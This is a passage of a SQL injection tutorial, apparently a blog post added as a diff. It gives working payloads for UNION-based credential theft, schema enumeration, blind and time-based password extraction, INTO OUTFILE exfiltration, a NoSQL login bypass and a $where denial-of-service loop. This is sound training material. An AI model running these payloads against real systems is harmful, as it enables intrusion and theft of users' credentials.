+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#66d9ef">NULL</span>,<span style="color:#66d9ef">NULL</span>,<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#75715e">--
+</span></span></span></code></pre></div><p>If the <strong>data type of a column is not compatible with string data</strong>, the injected query will cause a <strong>database error</strong>, such as:</p>
+<p><code>Conversion failed when converting the varchar value 'a' to data type int.</code></p>
+<p>If an error does not occur, and the <strong>application&rsquo;s response contains some additional content including the injected string value</strong>, then the relevant column is suitable for <strong>retrieving string data</strong>.</p>
+<p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">Lab: SQL injection UNION attack, finding a column containing text  Web Security Academy</a></p>
+<p>.</p>
+<p>.</p>
+<p><strong>Using an SQL injection UNION attack to retrieve interesting data</strong></p>
+<p>Suppose that:</p>
+<ul>
+<li>The original query returns two columns, both of which can hold string data.</li>
+<li>The injection point is a quoted string within the <code>WHERE</code> clause.</li>
+<li>The database contains a table called <code>users</code> with the columns <code>username</code> and <code>password</code>.</li>
+</ul>
+<p>In this situation, you can retrieve the contents of the <code>users</code> table by submitting the input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT username, password FROM users--
+</span></span></span></code></pre></div><p>Of course, the crucial information needed to perform this attack is that there is a table called <code>users</code>
+ with two columns called <code>username</code>and <code>password</code>
+Without this information, you would be left trying to guess the names of tables and columns.</p>
+<p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables">Lab: SQL injection UNION attack, retrieving data from other tables  Web Security Academy</a></p>
+<p>.</p>
+<p>.</p>
+<p><strong>Retrieving multiple values within a single column</strong></p>
+<p>You can easily retrieve <strong>multiple values together</strong> within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values.</p>
+<p>For example, on Oracle you could submit the input: <code>' UNION SELECT username || '~' || password FROM users--</code></p>
+<p>The results from the query will let you read all of the usernames and passwords, for example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>administrator<span style="color:#f92672">~</span>s3cure
+</span></span><span style="display:flex;"><span>wiener<span style="color:#f92672">~</span>peter
+</span></span><span style="display:flex;"><span>carlos<span style="color:#f92672">~</span>montoya
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column">Lab: SQL injection UNION attack, retrieving multiple values in a single column  Web Security Academy</a></p>
+<hr>
+<h1 id="examining-the-database-in-sql-injection-attacks"><code>Examining the database in SQL injection attacks</code></h1>
+<p>When exploiting SQL injection vulnerabilities, it is often necessary to <strong>gather some information about the database itself.</strong></p>
+<h3 id="querying-the-database-type-and-version"><strong>Querying the database type and version</strong></h3>
+<p>For example, you could use a <code>UNION</code> attack with the following input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT @@version--
+</span></span></span></code></pre></div><p>This might return output like the following, confirming that the database is <strong>Microsoft SQL Server</strong>, and the <strong>version</strong> that is being used:</p>
+<p>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <!-- raw HTML omitted --> (Build 14393: ) (Hypervisor)</p>
+<p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">Lab: SQL injection attack, querying the database type and version on Oracle  Web Security Academy</a></p>
+<p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft  Web Security Academy</a></p>
+<h3 id="listing-the-contents-of-the-database"><strong>Listing the contents of the database</strong></h3>
+<p>You can query <code>information_schema.tables</code> to list the tables in the database:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> information_schema.tables
+</span></span></code></pre></div><p>This returns output like the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>TABLE_CATALOG  TABLE_SCHEMA  <span style="color:#66d9ef">TABLE_NAME</span>  TABLE_TYPE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================</span>
+</span></span><span style="display:flex;"><span>MyDatabase     dbo           Products    BASE <span style="color:#66d9ef">TABLE</span>
+</span></span><span style="display:flex;"><span>MyDatabase     dbo           Users       BASE <span style="color:#66d9ef">TABLE</span>
+</span></span><span style="display:flex;"><span>MyDatabase     dbo           Feedback    BASE <span style="color:#66d9ef">TABLE</span>
+</span></span></code></pre></div><p>You can then query <code>information_schema.columns</code> to list the columns in individual tables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> information_schema.columns <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">table_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Users&#39;</span>
+</span></span></code></pre></div><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">Lab: SQL injection attack, listing the database contents on non-Oracle databases Web Security Academy</a></p>
+<h3 id="equivalent-to-information-schema-on-oracle">Equivalent to information schema on Oracle</h3>
+<p>You can list tables by querying <code>all_tables</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> all_tables
+</span></span></code></pre></div><p>And you can list columns by querying <code>all_tab_columns</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> all_tab_columns <span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">table_name</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;USERS&#39;</span>
+</span></span></code></pre></div><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">Lab: SQL injection attack, listing the database contents on Oracle Web Security Academy</a></p>
+<hr>
+<h1 id="blind-sql-injection"><code>Blind SQL injection</code></h1>
+<p>###*<strong>What is blind SQL injection?</strong></p>
+<p>Blind SQL injection arises when an application is vulnerable to <strong>SQL injection</strong>, but its HTTP responses <strong>do not contain the results of the relevant SQL query</strong> or the details of any database errors.</p>
+<h3 id="exploiting-blind-sql-injection-by-triggering-conditional-responses">Exploiting Blind SQL injection by triggering conditional responses</h3>
+<p>Consider an application that uses <strong>tracking cookies to gather analytics about usage</strong>. Requests to the application include a cookie header like this: <code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code></p>
+<p>When a request containing a <code>TrackingId</code>cookie is processed, the application determines whether this is a known user using an SQL query like this:</p>
+<p><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</code></p>
+<p>To see how this works, suppose that two requests are sent containing the following <code>TrackingId</code>cookie values in turn:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">…</span>xyz<span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">…</span>xyz<span style="color:#e6db74">&#39; AND &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><p>The first of these values will cause the query to <strong>return results,</strong> because the injected <code>AND '1'='1</code>condition is true, and so the &ldquo;Welcome back&rdquo; message will be displayed. Whereas the second value will cause the query to <strong>not return any results</strong>, because the injected condition is <strong>false</strong>, and so the &ldquo;Welcome back&rdquo; message will not be displayed. This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.</p>
+<p>For example, suppose there is a table called <code>Users</code> with the columns <code>Username</code> and <code>Password</code>, and a user called <code>Administrator</code>. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time. To do this, we start with the following input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>xyz<span style="color:#e6db74">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span>Administrator<span style="color:#e6db74">&#39;), 1, 1) &gt; &#39;</span>m
+</span></span></code></pre></div><p>This returns the &ldquo;Welcome back&rdquo; message, indicating that the injected condition is true, and so the first character of the password is greater than <code>m</code>.</p>
+<p>Next, we send the following input:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>xyz<span style="color:#e6db74">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span>Administrator<span style="color:#e6db74">&#39;), 1, 1) &gt; &#39;</span>t
+</span></span></code></pre></div><p>This does not return the &ldquo;Welcome back&rdquo; message, indicating that the injected condition is false, and so the first character of the password is not greater than <code>t</code>
+.Eventually, we send the following input, which returns the &ldquo;Welcome back&rdquo; message, thereby confirming that the first character of the password is <code>s</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>xyz<span style="color:#e6db74">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span>Administrator<span style="color:#e6db74">&#39;), 1, 1) = &#39;</span>s
+</span></span></code></pre></div><p>We can continue this process to systematically determine the full password for the <code>Administrator</code> user.</p>
+<hr>
+<h1 id="hunting-for-sql-injections"><code>Hunting for SQL Injections</code></h1>
+<p>Before we dive into each type, a common technique for detecting any SQL injection is to insert <strong>a single quote character (&rsquo;)</strong> into every user input and look for <strong>errors</strong> or other <strong>anomalies</strong>.</p>
+<p>Another general way of finding SQL injections is <strong>fuzzing</strong>, which is the practice of submitting specifically <strong>designed SQL injection payloads</strong> to the application and <strong>monitoring the server’s response</strong>.</p>
+<p>.</p>
+<p>.</p>
+<h2 id="step-1-look-for-classic-sql-injections">Step 1: Look for Classic SQL Injections</h2>
+<p>UNION-based approach: an attacker uses the <strong>UNION operator</strong> to concatenate the results of another query onto the web application’s response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Title, Body <span style="color:#66d9ef">FROM</span> Emails
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vickie&#39;</span> <span style="color:#66d9ef">AND</span> AccessKey<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ZB6w0YLjzvAVmp6zvr&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> Username, Password <span style="color:#66d9ef">FROM</span> Users;<span style="color:#75715e">-- ;
+</span></span></span></code></pre></div><p>For example, we can induce an error by using the <code>CONVERT()</code> function in MySQL:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Title, Body <span style="color:#66d9ef">FROM</span> Emails
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vickie&#39;</span> <span style="color:#66d9ef">AND</span> AccessKey<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ZB6w0YLjzvAVmp6zvr&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">CONVERT</span>((<span style="color:#66d9ef">SELECT</span> Password <span style="color:#66d9ef">FROM</span> Users <span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>), DATE); <span style="color:#75715e">--
+</span></span></span></code></pre></div><p>The <code>CONVERT(VALUE, FORMAT)</code> function attempts to convert VALUE to the format specified by FORMAT. Therefore, this query will force the database to convert the <strong>admin’s password to a date format</strong>, which can sometimes cause
+the database to throw a descriptive error like this one:   <code>Conversion failed when trying to convert &quot;t5dJ12rp$fMDEbSWz&quot; to data type &quot;date&quot;.</code></p>
+<p>.</p>
+<p>.</p>
+<h2 id="step-2-look-for-blind-sql-injections">Step 2: Look for Blind SQL Injections</h2>
+<p>Blind SQL injections have two subtypes as well: <strong>Boolean</strong> based and <strong>time</strong> based.</p>
+<p>Boolean-based SQL injection occurs when attackers <strong>infer the structure of the database</strong> by injecting test conditions into the SQL query that will return either <strong>true</strong> or <strong>false</strong>.</p>
+<p>For example, let’s say that <a href="http://example.com/">example.com</a> maintains a separate table to keep track of the premium members on the platform.</p>
+<p>The site determines who is premium by using a cookie that <strong>contains the user’s ID and matching it against a table of registered premium members</strong>. The GET request containing such a cookie might look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">GET</span> <span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span><span style="display:flex;"><span>Cookie: user_id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+</span></span></code></pre></div><p>The application uses this request to produce the following SQL query: <code>SELECT * FROM PremiumUsers WHERE Id='2';</code></p>
+<p>Let’s say your account isn’t premium. What would happen if you submit <strong>this user ID instead</strong>?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">2</span><span style="color:#e6db74">&#39; UNION SELECT Id FROM Users
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WHERE Username = &#39;</span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">and SUBSTR(Password, 1, 1) =&#39;</span>a<span style="color:#e6db74">&#39;;--
+</span></span></span></code></pre></div><p>Well, the query would become the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> PremiumUsers <span style="color:#66d9ef">WHERE</span> Id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;2&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> Id <span style="color:#66d9ef">FROM</span> Users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">and</span> SUBSTR(Password, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>;<span style="color:#75715e">-- returns the first character of each user’s password
+</span></span></span></code></pre></div><p>Since user 2 isn’t a premium member, whether this query returns data will depend on the <strong>second SELECT statement</strong>, which returns data if the admin account’s password starts with an a. This means you can <strong>brute-force</strong>
+the admin’s password; if you submit this user ID as a cookie, the web application would display the premium banner if the admin account’s password starts with an <strong>a.</strong></p>
+<p>A time-based SQL injection is similar, but instead of <strong>relying on a visual cue in the web application</strong>, the attacker relies on the <strong>response-time difference caused by different SQL injection payloads</strong>.</p>
+<p>Let’s say premium members don’t get a <strong>special banner</strong>, and their user interfaces don’t look any different. How do you exploit this SQL injection then?</p>
+<p>If the time delay occurs, you’ll know the query worked correctly. Try using an <strong>IF statement</strong> in the SQL query:   <code>IF(CONDITION, IF-TRUE, IF-FALSE)</code></p>
+<p>For example, say you submit the following ID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">2</span><span style="color:#e6db74">&#39; UNION SELECT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">IF(SUBSTR(Password, 1, 1) = &#39;</span>a<span style="color:#e6db74">&#39;, SLEEP(10), 0)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Password FROM Users
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WHERE Username = &#39;</span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;;
+</span></span></span></code></pre></div><p>The SQL query would become the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> PremiumUsers <span style="color:#66d9ef">WHERE</span> Id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;2&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">IF</span>(SUBSTR(Password, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span>, SLEEP(<span style="color:#ae81ff">10</span>), <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">FROM</span> Users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>;
+</span></span></code></pre></div><p>This query will instruct the database to <strong>sleep for 10 seconds if the admin’s password starts with an a</strong> character. Using this technique, you can slowly figure out the admin’s password.</p>
+<p>.</p>
+<p>.</p>
+<h2 id="step-3-exfiltrate-information-by-using-sql-injections">Step 3: Exfiltrate Information by Using SQL Injections</h2>
+<p>For example, the following query will cause the database to write the admin’s password into <code>/var/www/html/output.txt</code>, a file located on the web root of the target web server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> Password <span style="color:#66d9ef">FROM</span> Users <span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INTO</span> OUTFILE <span style="color:#e6db74">&#39;/var/www/html/output.txt&#39;</span>
+</span></span></code></pre></div><p>Then browsering the informations by navigating  <a href="https://example.com/output.txt">https://example.com/output.txt</a></p>
+<p>This technique is also a good way to detect <strong>second order SQL injections</strong>, since in second-order SQL injections, there is often a time delay between the malicious input and the SQL query being executed.</p>
+<p>Say that when you browse <code>example.com</code>, the application adds you to a database table to keep track of currently active users. Accessing a page with a cookie, like this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">GET</span> <span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span><span style="display:flex;"><span>Cookie: user_id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, username<span style="color:#f92672">=</span>vickie
+</span></span></code></pre></div><p>The application uses an <strong>INSERT statement</strong> to add you to the ActiveUsers table. INSERT statements add a row into the specified table with the specified values:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> ActiveUsers
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;vickie&#39;</span>)
+</span></span></code></pre></div><p>In this case, an attacker can craft a malicious cookie to inject into the INSERT statement:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">GET</span> <span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Host</span>: example.com
+</span></span><span style="display:flex;"><span>Cookie: <span style="color:#ae81ff">1</span> user_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#39;, (SELECT Password FROM Users
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WHERE Username=&#39;admin&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">INTO OUTFILE &#39;/var/www/html/output.txt&#39;));-- &#34;</span>, username<span style="color:#f92672">=</span>vickie
+</span></span></code></pre></div><p>This cookie 1 will, in turn, cause the INSERT statement to save the admin’s password into the output.txt file on the victim server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> ActiveUsers
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;2&#39;</span>, (<span style="color:#66d9ef">SELECT</span> Password <span style="color:#66d9ef">FROM</span> Users
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> Username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INTO</span> OUTFILE <span style="color:#e6db74">&#39;/var/www/html/output.txt&#39;</span>));<span style="color:#75715e">-- &#39;, &#39;vickie&#39;);
+</span></span></span></code></pre></div><p>.</p>
+<p>.</p>
+<h2 id="step-4-look-for-nosql-injections">Step 4: Look for NoSQL Injections</h2>
+<p>Take MongoDB, for example. In MongoDB syntax, <code>Users.find()</code> returns users that meet a certain criteria. For example, the following query returns users with the username vickie and the password password123:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">Users</span><span style="color:#f92672">.</span>find({<span style="color:#e6db74">username</span>: <span style="color:#e6db74">&#39;vickie&#39;</span>, <span style="color:#e6db74">password</span>: <span style="color:#e6db74">&#39;password123&#39;</span>});
+</span></span></code></pre></div><p>If the application uses this functionality to log in users and populates the database query directly with user input, like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">Users</span><span style="color:#f92672">.</span>find({<span style="color:#e6db74">username</span>: $username, <span style="color:#e6db74">password</span>: $password});
+</span></span></code></pre></div><p>For example, let’s say that the attacker submits a username of admin and a password of <code>{$ne: &quot;&quot;}.</code> The database query would become as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">Users</span><span style="color:#f92672">.</span>find({<span style="color:#e6db74">username</span>: <span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#e6db74">password</span>: {$ne: <span style="color:#e6db74">&#34;&#34;</span>}});
+</span></span></code></pre></div><p>In MongoDB, <code>$ne</code> selects objects whose value is <strong>not equal to the specified value</strong>. Here, the query would return users whose username is admin and password isn’t <strong>equal to an empty string</strong>, which is true unless the admin has a <strong>blank password!</strong></p>
+<p>For example, you can define a <code>function</code> within the <code>$where</code> operator to find users named vickie:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">Users</span><span style="color:#f92672">.</span>find( { $where: function() {
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> (this<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;vickie&#39;</span>) } } );
+</span></span></code></pre></div><p>For example, the following piece of malicious code will launch a <strong>denial-of-service (DoS)</strong> attack by triggering a never-ending while loop:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">Users</span><span style="color:#f92672">.</span>find( { $where: function() {
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> (this<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;vickie&#39;</span>; <span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">true</span>){};) } } );
+</span></span></code></pre></div><p>The process of looking for NoSQL injections is similar to detecting SQL injections. You can insert special characters such as quotes (&rsquo; &ldquo;), semicolons (;), and backslashes (), as well as parentheses (()), brackets([]), and
+braces ({}) into user-input fields and look for errors or other anomalies. You can also automate the hunting process by using the tool NoSQLMap
+(<a href="https://github.com/codingo/NoSQLMap/">https://github.com/codingo/NoSQLMap/</a>).</p>
+<hr>
+<h1 id="escalating-the-attack"><code>Escalating the Attack</code></h1>
+<h2 id="learn-about-the-database">Learn About the Database</h2>
+<p>First, it’s useful to gain information about the <strong>structure</strong> of the <strong>database</strong>.</p>
+<p>To start with, you need to determine the database software and its structure.</p>
+<p>Some common commands for querying the version type are <code>@@version</code> for Microsoft SQL Server and MySQL, <code>version()</code> for PostgreSQL, and <code>v$version</code> for Oracle.</p>
+<p>This query in MySQL will show you the table names of user-defined tables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">Title</span>, <span style="color:#66d9ef">Body</span> <span style="color:#66d9ef">FROM</span> <span style="color:#66d9ef">Emails</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> <span style="color:#66d9ef">Username</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vickie&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>, table_name <span style="color:#66d9ef">FROM</span> information_schema<span style="color:#f92672">.</span>tables
+</span></span></code></pre></div><p>And this one will show you the column names of the specified table. In this case, the query will list the columns in the Users table:</p>
